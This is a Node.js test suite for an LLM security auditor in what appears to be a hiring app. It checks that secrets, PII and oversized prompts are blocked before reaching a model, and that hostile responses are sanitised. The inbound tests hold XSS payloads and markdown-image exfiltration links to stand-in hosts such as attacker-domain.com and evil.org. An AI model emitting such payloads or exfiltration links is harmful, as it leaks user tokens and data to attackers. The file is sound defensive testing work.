import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import {
  auditOutboundAiRequest,
  auditInboundAiResponse,
  AI_SECURITY_VIOLATION_TYPE,
} from '../src/domain/ai/aiSecurityAuditor.js';
import { AI_CONTRACT_ID } from '../src/domain/ai/aiContracts.js';
import {
  fakeCredentialedUri,
  fakeGoogleApiKey,
  fakeJwt,
} from './helpers/fakeSecrets.js';
import {
  registerAiProvider,
  requestCompletion,
  resetAiProviders,
  useAiProvider,
} from '../src/services/ai/aiProvider.js';

describe('Task 15 — Prompt Injection, AI Privacy & LLM Security Hardening Suite', () => {
  // =========================================================================
  // 1. Outbound Secret Leak Prevention
  // =========================================================================
  describe('1. Outbound Secret Leak Prevention', () => {
    it('blocks outbound requests containing Google / Gemini API keys', () => {
      const leakyRequest = {
        contractId: AI_CONTRACT_ID.RESUME_EXTRACTION,
        system: 'You are an extraction assistant.',
        user: 'Here is candidate resume. Internal key: ' + fakeGoogleApiKey(39),
      };

      assert.throws(
        () => auditOutboundAiRequest(leakyRequest),
        /Outbound AI Security Block: Attempted to transmit sensitive secrets/i,
      );
    });

    it('blocks outbound requests containing JWT tokens or Database URIs', () => {
      const jwtRequest = {
        contractId: AI_CONTRACT_ID.INTERVIEW_EVALUATION,
        system: 'Evaluate answer.',
        user: 'Bearer ' + fakeJwt(),
      };

      assert.throws(
        () => auditOutboundAiRequest(jwtRequest),
        /Outbound AI Security Block: Attempted to transmit sensitive secrets/i,
      );

      const dbRequest = {
        contractId: AI_CONTRACT_ID.RESUME_EXTRACTION,
        system: 'Extract data.',
        user: 'Connect to ' + fakeCredentialedUri('mongodb+srv', '/prod'),
      };

      assert.throws(
        () => auditOutboundAiRequest(dbRequest),
        /Outbound AI Security Block: Attempted to transmit sensitive secrets/i,
      );
    });
  });

  // =========================================================================
  // 2. Outbound Denial-of-Wallet & Context Flooding Defense
  // =========================================================================
  describe('2. Outbound Denial-of-Wallet & Context Flooding Defense', () => {
    it('rejects oversized prompts exceeding contract context character bounds with 400', () => {
      const oversizedNarrativeRequest = {
        contractId: AI_CONTRACT_ID.CAREERTWIN_NARRATIVE, // maxInputChars is 5,000
        system: 'Write summary.',
        user: 'A'.repeat(6_000),
      };

      assert.throws(
        () => auditOutboundAiRequest(oversizedNarrativeRequest),
        /AI request exceeds safe context character limit/i,
      );
    });
  });

  // =========================================================================
  // 3. Privacy & Data Minimization
  // =========================================================================
  describe('3. Privacy & Data Minimization', () => {
    it('enforces PII minimization by blocking emails in presentation requests', () => {
      const narrativeWithEmail = {
        contractId: AI_CONTRACT_ID.CAREERTWIN_NARRATIVE,
        system: 'Write summary.',
        user: 'Skills: JavaScript. Contact: student.private@university.edu',
      };

      assert.throws(
        () => auditOutboundAiRequest(narrativeWithEmail),
        /CareerTwin narrative request must not contain candidate email/i,
      );
    });

    it('enforces PII minimization by blocking phone numbers in presentation requests', () => {
      const narrativeWithPhone = {
        contractId: AI_CONTRACT_ID.CAREERTWIN_NARRATIVE,
        system: 'Write summary.',
        user: 'Skills: React. Phone: +1 (555) 234-5678',
      };

      assert.throws(
        () => auditOutboundAiRequest(narrativeWithPhone),
        /CareerTwin narrative request must not contain candidate phone numbers/i,
      );
    });
  });

  // =========================================================================
  // 4. Inbound Malicious Markdown, HTML & XSS Neutralization
  // =========================================================================
  describe('4. Inbound Malicious Markdown, HTML & XSS Neutralization', () => {
    it('neutralizes malicious script tags and inline event handlers in model responses', () => {
      const rawResponse = 'Candidate answer was good. <script>alert("pwned")</script><img src=x onerror="stealCookies()">';
      const audited = auditInboundAiResponse(rawResponse);

      assert.ok(audited.violations.includes(AI_SECURITY_VIOLATION_TYPE.MALICIOUS_HTML_OR_XSS));
      assert.ok(!audited.sanitizedText.includes('<script>'));
      assert.ok(audited.sanitizedText.includes('[REDACTED_SCRIPT]'));
      assert.ok(!audited.sanitizedText.includes('onerror'));
    });

    it('neutralizes markdown image data exfiltration URLs in model responses', () => {
      const rawResponse = 'Summary: Candidate profile verified. ![leak](https://attacker-domain.com/collect?token=secret123)';
      const audited = auditInboundAiResponse(rawResponse);

      assert.ok(audited.violations.includes(AI_SECURITY_VIOLATION_TYPE.DATA_EXFILTRATION_PAYLOAD));
      assert.ok(!audited.sanitizedText.includes('https://attacker-domain.com'));
      assert.ok(audited.sanitizedText.includes('[REDACTED_IMAGE_EXFILTRATION]'));
    });

    it('redacts server secrets reflected in model responses', () => {
      const rawResponse = 'Evaluator processed answer using apiKey: ' + fakeGoogleApiKey(35);
      const audited = auditInboundAiResponse(rawResponse);

      assert.ok(audited.violations.includes(AI_SECURITY_VIOLATION_TYPE.SECRET_LEAK_PREVENTED));
      assert.ok(!audited.sanitizedText.includes('AIzaSyB1234567890'));
      assert.ok(audited.sanitizedText.includes('[REDACTED_SECRET]'));
    });
  });

  // =========================================================================
  // 5. End-to-End Provider Security Integration
  // =========================================================================
  describe('5. End-to-End Provider Security Integration', () => {
    it('blocks outbound requests with secrets before reaching provider and sanitizes inbound responses', async () => {
      let providerCalled = false;

      const mockProvider = {
        name: 'security-test-provider',
        async complete(req) {
          providerCalled = true;
          return {
            text: 'Hello. Here is an exfil test: ![ex](https://evil.org/log) with <script>evil()</script>',
            model: 'mock-security-model',
          };
        },
      };

      registerAiProvider(mockProvider);
      useAiProvider('security-test-provider');

      try {
        // Test outbound block: provider must NEVER be called
        const badReq = {
          contractId: AI_CONTRACT_ID.INTERVIEW_EVALUATION,
          system: 'Evaluate answer.',
          user: 'Secret key leaked: ' + fakeGoogleApiKey(35),
        };

        await assert.rejects(
          async () => requestCompletion(badReq),
          /Outbound AI Security Block/i,
        );
        assert.equal(providerCalled, false, 'Provider must not be invoked when secret leak is detected');

        // Test safe outbound call: provider called and inbound sanitized
        const goodReq = {
          contractId: AI_CONTRACT_ID.INTERVIEW_EVALUATION,
          system: 'Evaluate answer.',
          user: 'A closure is a function bundled with its lexical environment.',
        };

        const result = await requestCompletion(goodReq);
        assert.equal(providerCalled, true);
        assert.ok(!result.text.includes('<script>'));
        assert.ok(!result.text.includes('https://evil.org'));
        assert.ok(result.securityViolations.length >= 2);
      } finally {
        resetAiProviders();
      }
    });
  });
});
